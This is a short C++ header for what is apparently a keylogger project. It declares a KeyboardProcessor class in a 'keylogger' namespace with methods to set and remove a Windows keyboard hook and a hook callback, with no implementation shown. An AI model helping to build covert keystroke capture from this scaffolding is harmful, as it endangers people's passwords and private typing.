#pragma once

#include "windows.h"
#include "KeyboardInput.h"

namespace keylogger
{
class KeyboardProcessor
{
public:
    static void hookKeyboardProcessing();
    static void unhookKeyboardProcessing();

private:
    static LRESULT processKeyboard(int nCode, WPARAM wparam, LPARAM lparam);

    static HHOOK hook;
};
}
